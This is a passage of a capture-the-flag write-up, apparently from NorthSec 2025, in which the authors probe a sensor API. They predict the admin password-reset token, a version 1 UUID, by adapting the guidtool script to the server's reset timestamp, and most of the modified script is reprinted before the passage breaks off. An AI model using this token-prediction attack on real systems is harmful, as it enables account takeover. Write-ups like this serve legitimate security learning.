+<h2 id="exploitation">Exploitation</h2>
+<h3 id="infinite-holes-of-rabbit">Infinite holes of rabbit</h3>
+<p>We took every possible rabbit holes on this track. Multiple reasons fort that:</p>
+<ul>
+<li>We were tired</li>
+<li>There was (too) many possibilities</li>
+<li>We suck at CTF</li>
+</ul>
+<h4 id="1">#1</h4>
+<p>So the first hint told us that the documentation is not complete. Since there is a <em>Documentation</em> tab, we focused on <code>this</code> specific documentation.</p>
+<p>This documentation contains a URL for the API Swagger:</p>
+<p><img alt="API Swagger" src="../res/nsec25/fast-api.png" /></p>
+<p>This API contains multiple endpoints. We tried to perform some actions using it:</p>
+<ul>
+<li><code>/api/register</code></li>
+</ul>
+<p>This endpoint is taking the following parameters:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="p">{</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span><span class="nt">&quot;device_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot;</span><span class="p">,</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">  </span><span class="nt">&quot;serial&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;AAAA-BBBB-YYYY&quot;</span><span class="p">,</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">  </span><span class="nt">&quot;machine_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;99999999999999999999999999999999&quot;</span><span class="p">,</span>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">  </span><span class="nt">&quot;ip&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&lt;ipv6-welcome-to-nsec&gt;&quot;</span><span class="p">,</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">  </span><span class="nt">&quot;mac&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;&lt;mac-address&gt;&quot;</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="p">}</span>
+</code></pre></div>
+<p>After some try and reading the <code>Devices</code> tab, we understood that:</p>
+<ul>
+<li><code>ip</code> is an arbitrary The IP(v6), let's say <code>9999:9999:9999:9999:9999:9999:9999:9999</code></li>
+<li><code>mac</code> is an arbitrary MAC address, let's say <code>00:18:55:aa:bb:cc</code></li>
+<li><code>machine_id</code> <em>seems</em> to be an arbitrary ID by sensor</li>
+<li><code>serial</code> is structured using</li>
+<li>The type of sensor, here it's <code>E4</code></li>
+<li>The MAC address</li>
+<li>A checksum based on the 2 first elements, since it's between <code>001</code> and <code>999</code> most of the time, it can be brute-forced</li>
+<li><code>device_id</code> is a checksum based on the <code>serial</code></li>
+</ul>
+<p>Regarding the size of the <code>device_id</code> we were not going to brute force it. We moved on.</p>
+<ul>
+<li><code>/api/licenses</code></li>
+</ul>
+<p>We had not been able to add a new license. Every modification of the license key leads us to an error. Administrator rights are required.</p>
+<ul>
+<li><code>/api/auth/reset</code></li>
+</ul>
+<p>We were able to reset the password of the <code>admin</code> account, but since we did not have access to its email it was useless.</p>
+<ul>
+<li><code>/api/metrics</code></li>
+</ul>
+<p>Administrator rights are required. We (also) moved on.</p>
+<h4 id="2">#2</h4>
+<p>Maybe the <em>Documentation</em> quoted by the first hint was speaking about the documentation of FastAPI. Maybe some calls were undocumented on the swagger.</p>
+<p>So we took a deep dive on the FastAPI, searching for some black magic API call. But we found nothing.</p>
+<p><img alt="FastAPI documentation" src="../res/nsec25/fastapi.png" /></p>
+<h4 id="3">#3</h4>
+<p>Then we thought that there was maybe a CVE on FastAPI related to the <code>X-Token</code> that we saw on some requests. Once again, we were wrong.</p>
+<h4 id="4">#4</h4>
+<p>If you go back to the hint, it's talking about the administrator and the fact that only an administrator can do things. So maybe we just need to be administrator after all.</p>
+<p>However there is no way to become administrator when we reset the password we just got this answer:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="p">{</span><span class="nt">&quot;detail&quot;</span><span class="p">:</span><span class="s2">&quot;ok&quot;</span><span class="p">,</span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="s2">&quot;2025-05-17T04:17:29.166084+00:00&quot;</span><span class="p">}</span>
+</code></pre></div>
+<p>There are two ways to reset the password:</p>
+<ul>
+<li>Getting access to the administrator email address</li>
+<li>Finding the token generated when we performed the password reset</li>
+</ul>
+<p>Since there is no way, based on our understanding, to get access to the email address we have to dig on the token.</p>
+<p>The token for the <code>demo</code> account was <code>14e355e1-f216-11ef-b19a-d0c637f44704</code>. Based on our limited knowledge, it is definitely a <code>UUID</code> which stands for <code>Universally Unique Identifier</code>.</p>
+<p>Using the web site <a href="https://www.uuidtools.com/decode">https://www.uuidtools.com/decode</a> we found that this <code>UUID</code> is a version 1 <code>UUID</code>:</p>
+<p><img alt="UUID decoder" src="../res/nsec25/uuid-decoder.png" /></p>
+<p>If you have a look at the screenshot, you can see that the last part of the UUID is a MAC address without the <code>:</code>.</p>
+<p>Wikipedia gave us a little bit more details regarding UUID v1:</p>
+<blockquote>
+<p>Version 1 concatenates the 48-bit MAC address of the "node" (that is, the computer generating the UUID), with a 60-bit timestamp, being the number of 100-nanosecond intervals since midnight 15 October 1582 Coordinated Universal Time (UTC).</p>
+</blockquote>
+<p>So, if we have the MAC address and the timestamp we should be able to brute force it. What a great idea. Let's do this.</p>
+<p>We found <a href="https://github.com/intruder-io/guidtool"><code>guidtool</code></a> which is described as <em>A tool to inspect and attack version 1 GUIDs</em>:</p>
+<p><img alt="guidtool" src="../res/nsec25/guidtool.png" /></p>
+<p>The usage is pretty simple, you just have to give a timestamp and a sample UUID and the tool is giving you a list of potential UUID:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="p">$</span> <span class="n">guidtool</span> <span class="n">-t</span> <span class="s1">&#39;2025-05-16 23:00:00&#39;</span> <span class="n">14e355e1-f216</span><span class="p">-</span><span class="n">11ef-b19a-d0c637f44704</span> <span class="p">|</span> <span class="n">head</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">d7e4bc00</span><span class="p">-</span><span class="n">32d5</span><span class="p">-</span><span class="n">11f0-b19a-d0c637f44704</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">d7e4e310</span><span class="p">-</span><span class="n">32d5</span><span class="p">-</span><span class="n">11f0-b19a-d0c637f44704</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="p">[...]</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="n">d7e5cd70</span><span class="p">-</span><span class="n">32d5</span><span class="p">-</span><span class="n">11f0-b19a-d0c637f44704</span>
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="n">d7e5f480</span><span class="p">-</span><span class="n">32d5</span><span class="p">-</span><span class="n">11f0-b19a-d0c637f44704</span>
+</code></pre></div>
+<p>Then we used the Intrudor tab of Burp to brute force the good UUID. Sadly, it did not work at all. We tried using multiple timestamp, but we were unable to get the right UUID.</p>
+<p>Let's think.</p>
+<ul>
+<li>This is the timestamp that the server sent us when we reset the password: <code>YYYY-MM-DDTHH:MM:SS.MS</code></li>
+<li>This is the timestamp that guidtool is taking as input: <code>YYYY-MM-DD HH:NN:SS</code></li>
+</ul>
+<p>Looks like we are missing something here. We need to be more accurate. We should have read the initial message to the end:</p>
+<p><img alt="TIME" src="../res/nsec25/time.png" /></p>
+<h3 id="uuid-is-the-answer">UUID is the answer</h3>
+<p>The tool does not give us the ability to specify the milliseconds so we have to update it. For now, it generates a lot of UUID with a variation of at least 1 second.</p>
+<p>Pretty much all the source code is in the <code>guidtool.py</code>, and everything we are interested in is definitely in this file.</p>
+<p>First, we have to update the <code>main</code> function since the <code>parser</code> does not allow us to use a timestamp with millisecond:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="p">[</span><span class="o">...</span><span class="p">]</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-t&quot;</span><span class="p">,</span> <span class="s2">&quot;--base-time&quot;</span><span class="p">,</span>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>                        <span class="n">help</span><span class="o">=</span><span class="s2">&quot;The estimated time at which the UUID was generated in &#39;</span><span class="si">%%</span><span class="s2">Y-</span><span class="si">%%</span><span class="s2">m-</span><span class="si">%%</span><span class="s2">d </span><span class="si">%%</span><span class="s2">H:</span><span class="si">%%</span><span class="s2">M:</span><span class="si">%%</span><span class="s2">S&#39; format, e.g. &#39;2021-03-17 16:42:11&#39;&quot;</span><span class="p">,</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>                        <span class="c1"># HERE: &quot;%Y-%m-%d %H:%M:%S</span>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>                        <span class="nb">type</span><span class="o">=</span><span class="k">lambda</span> <span class="n">s</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s2">&quot;%Y-%m-</span><span class="si">%d</span><span class="s2"> %H:%M:%S&quot;</span><span class="p">))</span>
+</code></pre></div>
+<p>Then, we have to make two modifications on the <code>genUUIDs</code> function:</p>
+<ol>
+<li>The <code>start</code> and <code>end</code> variable are calculated using a variation of 1 second. We need to remove it to be more accurate.</li>
+<li>Then we can remove the <code>for</code> and replace the <code>t</code> parameter of the <code>uuid1</code> function call by <code>start</code> or <code>end</code>:</li>
+</ol>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">genUUIDs</span><span class="p">(</span><span class="n">sample_uuid</span><span class="p">,</span> <span class="n">precision</span><span class="p">,</span> <span class="n">seconds</span><span class="p">,</span> <span class="n">base_time</span><span class="p">):</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="p">[</span><span class="o">...</span><span class="p">]</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>    <span class="n">dt_zero</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="p">(</span><span class="mi">1582</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>    <span class="n">base_guid_time</span> <span class="o">=</span> <span class="n">base_time</span> <span class="o">-</span> <span class="n">dt_zero</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>    <span class="n">base_timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">base_guid_time</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">()</span> <span class="o">*</span> <span class="mf">1e7</span><span class="p">)</span>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>    <span class="c1"># HERE: (1e7)*seconds</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>    <span class="n">start</span> <span class="o">=</span>  <span class="nb">int</span><span class="p">(</span><span class="n">base_timestamp</span> <span class="o">-</span> <span class="p">(</span><span class="mf">1e7</span><span class="p">)</span><span class="o">*</span><span class="n">seconds</span><span class="p">)</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>    <span class="c1"># HERE: (1e7)*seconds</span>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>    <span class="n">end</span> <span class="o">=</span>  <span class="nb">int</span><span class="p">(</span><span class="n">base_timestamp</span> <span class="o">+</span> <span class="p">(</span><span class="mf">1e7</span><span class="p">)</span><span class="o">*</span><span class="n">seconds</span><span class="p">)</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>    <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">precision</span><span class="p">):</span>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>        <span class="k">yield</span> <span class="n">uuid1</span><span class="p">(</span><span class="n">u</span><span class="o">.</span><span class="n">node</span><span class="p">,</span> <span class="n">u</span><span class="o">.</span><span class="n">clock_seq</span><span class="p">,</span> <span class="n">t</span><span class="p">)</span>
+</code></pre></div>
+<p>The final code is below:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="ch">#! /usr/bin/env python3</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">uuid</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">datetime</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="k">def</span><span class="w"> </span><span class="nf">UUIDTime</span><span class="p">(</span><span class="n">u</span><span class="p">):</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>    <span class="n">dt_zero</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="p">(</span><span class="mi">1582</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>    <span class="k">return</span> <span class="n">dt_zero</span> <span class="o">+</span> <span class="n">datetime</span><span class="o">.</span><span class="n">timedelta</span><span class="p">(</span><span class="n">microseconds</span><span class="o">=</span><span class="n">u</span><span class="o">.</span><span class="n">time</span><span class="o">//</span><span class="mi">10</span><span class="p">)</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="k">def</span><span class="w"> </span><span class="nf">UUIDMac</span><span class="p">(</span><span class="n">u</span><span class="p">):</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>    <span class="k">return</span> <span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s1">&#39;</span><span class="si">{:02x}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">((</span><span class="n">u</span><span class="o">.</span><span class="n">node</span> <span class="o">&gt;&gt;</span> <span class="n">ele</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="k">for</span> <span class="n">ele</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">8</span><span class="o">*</span><span class="mi">6</span><span class="p">,</span><span class="mi">8</span><span class="p">)][::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="k">def</span><span class="w"> </span><span class="nf">uuid1</span><span class="p">(</span><span class="n">node</span><span class="p">,</span> <span class="n">clock_seq</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">):</span>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>    <span class="n">time_low</span> <span class="o">=</span> <span class="n">timestamp</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span>
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>    <span class="n">time_mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">timestamp</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>    <span class="n">time_hi_version</span> <span class="o">=</span> <span class="p">(</span><span class="n">timestamp</span> <span class="o">&gt;&gt;</span> <span class="mi">48</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x0fff</span>
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>    <span class="n">clock_seq_low</span> <span class="o">=</span> <span class="n">clock_seq</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>    <span class="n">clock_seq_hi_variant</span> <span class="o">=</span> <span class="p">(</span><span class="n">clock_seq</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x3f</span>
+<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a>    <span class="k">return</span> <span class="n">uuid</span><span class="o">.</span><span class="n">UUID</span><span class="p">(</span><span class="n">fields</span><span class="o">=</span><span class="p">(</span><span class="n">time_low</span><span class="p">,</span> <span class="n">time_mid</span><span class="p">,</span> <span class="n">time_hi_version</span><span class="p">,</span> <span class="n">clock_seq_hi_variant</span><span class="p">,</span> <span class="n">clock_seq_low</span><span class="p">,</span> <span class="n">node</span><span class="p">),</span> <span class="n">version</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
+<a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>
+<a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a><span class="k">def</span><span class="w"> </span><span class="nf">printUUIDInfo</span><span class="p">(</span><span class="n">u</span><span class="p">):</span>
+<a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>    <span class="k">try</span><span class="p">:</span>
+<a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a>        <span class="n">u</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">UUID</span><span class="p">(</span><span class="n">u</span><span class="p">)</span>
+<a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a>    <span class="k">except</span> <span class="ne">ValueError</span><span class="p">:</span>
+<a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Invalid UUID&quot;</span><span class="p">)</span>
+<a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a>
+<a id="__codelineno-6-30" name="__codelineno-6-30" href="#__codelineno-6-30"></a>    <span class="nb">print</span> <span class="p">(</span><span class="s2">&quot;UUID version: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">u</span><span class="o">.</span><span class="n">version</span><span class="p">))</span>
+<a id="__codelineno-6-31" name="__codelineno-6-31" href="#__codelineno-6-31"></a>
+<a id="__codelineno-6-32" name="__codelineno-6-32" href="#__codelineno-6-32"></a>    <span class="k">if</span> <span class="n">u</span><span class="o">.</span><span class="n">version</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+<a id="__codelineno-6-33" name="__codelineno-6-33" href="#__codelineno-6-33"></a>        <span class="n">t</span> <span class="o">=</span> <span class="n">UUIDTime</span><span class="p">(</span><span class="n">u</span><span class="p">)</span>
+<a id="__codelineno-6-34" name="__codelineno-6-34" href="#__codelineno-6-34"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;UUID time: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">t</span><span class="p">))</span>
+<a id="__codelineno-6-35" name="__codelineno-6-35" href="#__codelineno-6-35"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;UUID timestamp: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">u</span><span class="o">.</span><span class="n">time</span><span class="p">))</span>
+<a id="__codelineno-6-36" name="__codelineno-6-36" href="#__codelineno-6-36"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;UUID node: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">u</span><span class="o">.</span><span class="n">node</span><span class="p">))</span>
+<a id="__codelineno-6-37" name="__codelineno-6-37" href="#__codelineno-6-37"></a>        <span class="n">m</span> <span class="o">=</span> <span class="n">UUIDMac</span><span class="p">(</span><span class="n">u</span><span class="p">)</span>
+<a id="__codelineno-6-38" name="__codelineno-6-38" href="#__codelineno-6-38"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;UUID MAC address: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
+<a id="__codelineno-6-39" name="__codelineno-6-39" href="#__codelineno-6-39"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;UUID clock sequence: </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">u</span><span class="o">.</span><span class="n">clock_seq</span><span class="p">))</span>
+<a id="__codelineno-6-40" name="__codelineno-6-40" href="#__codelineno-6-40"></a>
+<a id="__codelineno-6-41" name="__codelineno-6-41" href="#__codelineno-6-41"></a><span class="k">def</span><span class="w"> </span><span class="nf">genUUIDs</span><span class="p">(</span><span class="n">sample_uuid</span><span class="p">,</span> <span class="n">precision</span><span class="p">,</span> <span class="n">seconds</span><span class="p">,</span> <span class="n">base_time</span><span class="p">):</span>
+<a id="__codelineno-6-42" name="__codelineno-6-42" href="#__codelineno-6-42"></a>    <span class="n">u</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">UUID</span><span class="p">(</span><span class="n">sample_uuid</span><span class="p">)</span>
+<a id="__codelineno-6-43" name="__codelineno-6-43" href="#__codelineno-6-43"></a>    <span class="k">if</span> <span class="n">u</span><span class="o">.</span><span class="n">version</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+<a id="__codelineno-6-44" name="__codelineno-6-44" href="#__codelineno-6-44"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Only v1 GUIDs supported&quot;</span><span class="p">)</span>
+<a id="__codelineno-6-45" name="__codelineno-6-45" href="#__codelineno-6-45"></a>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<a id="__codelineno-6-46" name="__codelineno-6-46" href="#__codelineno-6-46"></a>
+<a id="__codelineno-6-47" name="__codelineno-6-47" href="#__codelineno-6-47"></a>    <span class="c1"># Get timestamp of starting GUID</span>
+<a id="__codelineno-6-48" name="__codelineno-6-48" href="#__codelineno-6-48"></a>    <span class="n">dt_zero</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="p">(</span><span class="mi">1582</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">15</span><span class="p">)</span>
+<a id="__codelineno-6-49" name="__codelineno-6-49" href="#__codelineno-6-49"></a>    <span class="n">base_guid_time</span> <span class="o">=</span> <span class="n">base_time</span> <span class="o">-</span> <span class="n">dt_zero</span>
+<a id="__codelineno-6-50" name="__codelineno-6-50" href="#__codelineno-6-50"></a>    <span class="n">base_timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">base_guid_time</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">()</span> <span class="o">*</span> <span class="mf">1e7</span><span class="p">)</span>
+<a id="__codelineno-6-51" name="__codelineno-6-51" href="#__codelineno-6-51"></a>
+<a id="__codelineno-6-52" name="__codelineno-6-52" href="#__codelineno-6-52"></a>    <span class="c1"># 1 second = 1e7 100-nanosecond intervals</span>
+<a id="__codelineno-6-53" name="__codelineno-6-53" href="#__codelineno-6-53"></a>    <span class="c1"># NSEC25 - Update here</span>
+<a id="__codelineno-6-54" name="__codelineno-6-54" href="#__codelineno-6-54"></a>    <span class="n">end</span> <span class="o">=</span>  <span class="nb">int</span><span class="p">(</span><span class="n">base_timestamp</span><span class="p">)</span>
+<a id="__codelineno-6-55" name="__codelineno-6-55" href="#__codelineno-6-55"></a>    <span class="n">start</span> <span class="o">=</span>  <span class="nb">int</span><span class="p">(</span><span class="n">base_timestamp</span><span class="p">)</span>
+<a id="__codelineno-6-56" name="__codelineno-6-56" href="#__codelineno-6-56"></a>    <span class="c1"># NSEC25 - Update here</span>
+<a id="__codelineno-6-57" name="__codelineno-6-57" href="#__codelineno-6-57"></a>    <span class="k">yield</span> <span class="n">uuid1</span><span class="p">(</span><span class="n">u</span><span class="o">.</span><span class="n">node</span><span class="p">,</span> <span class="n">u</span><span class="o">.</span><span class="n">clock_seq</span><span class="p">,</span> <span class="n">start</span><span class="p">)</span>
+<a id="__codelineno-6-58" name="__codelineno-6-58" href="#__codelineno-6-58"></a>
+<a id="__codelineno-6-59" name="__codelineno-6-59" href="#__codelineno-6-59"></a><span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+<a id="__codelineno-6-60" name="__codelineno-6-60" href="#__codelineno-6-60"></a>    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
+<a id="__codelineno-6-61" name="__codelineno-6-61" href="#__codelineno-6-61"></a>    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-i&quot;</span><span class="p">,</span> <span class="s2">&quot;--info&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;Print UUID info an exit&quot;</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s2">&quot;store_true&quot;</span><span class="p">)</span>
+<a id="__codelineno-6-62" name="__codelineno-6-62" href="#__codelineno-6-62"></a>
+<a id="__codelineno-6-63" name="__codelineno-6-63" href="#__codelineno-6-63"></a>    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-p&quot;</span><span class="p">,</span> <span class="s2">&quot;--precision&quot;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">10000</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;The number of 100-nanosecond intervals between each UUID (default 10000)&quot;</span><span class="p">)</span>
+<a id="__codelineno-6-64" name="__codelineno-6-64" href="#__codelineno-6-64"></a>    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-r&quot;</span><span class="p">,</span> <span class="s2">&quot;--range&quot;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;The number of seconds each side of the timestamp to generate UUIDs for (deafult 1)&quot;</span><span class="p">)</span>
+<a id="__codelineno-6-65" name="__codelineno-6-65" href="#__codelineno-6-65"></a>    <span class="c1"># NSEC25 - Update here</span>
+<a id="__codelineno-6-66" name="__codelineno-6-66" href="#__codelineno-6-66"></a>    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-t&quot;</span><span class="p">,</span> <span class="s2">&quot;--base-time&quot;</span><span class="p">,</span>
